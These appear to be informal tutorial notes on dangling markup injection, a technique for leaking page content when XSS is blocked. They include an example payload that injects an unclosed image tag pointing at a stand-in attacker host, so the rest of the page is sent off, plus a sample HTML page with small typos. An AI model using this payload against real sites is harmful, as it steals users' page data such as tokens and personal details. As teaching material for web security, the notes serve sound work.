Dangling Markup Injection
-----------------------------------------------------------------------+

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible

~ suppose an application doesnt filter special characters but has CSP or other means to stop XSS then even though you can inject harmful characters the xss will not execute
~ ** REMEMBER that dangling markup injection is only present if xss does not execute but characters are not sanitized**
~ anywhere in the application where your input is reflected can be a door to dangling markup similar to how you would look for XSS

eg following  CSP headers are present

X-Content-Security-Policy: allow 'self' *.example.com
X-Content-Security-Policy: allow 'self'; img-src *; script-src www.example.com

~ an attacker can put "><img src='//attacker-website.com?  , what this does is all the code after the injected point will be sent to the attackers server as a request eg

<body backround-color="blue">

<input type"text" name="search">
<script> your results for "><img src='//attacker-website.com? is </script>
<Label>Name : tester</Label>

now in the above all the data from attack-website.com? onwards will be sent to attacker up till the end of page and special characters will be url encoded

<noscript> Is a tag whose content will be interpreted if the browser doesn't support javascript
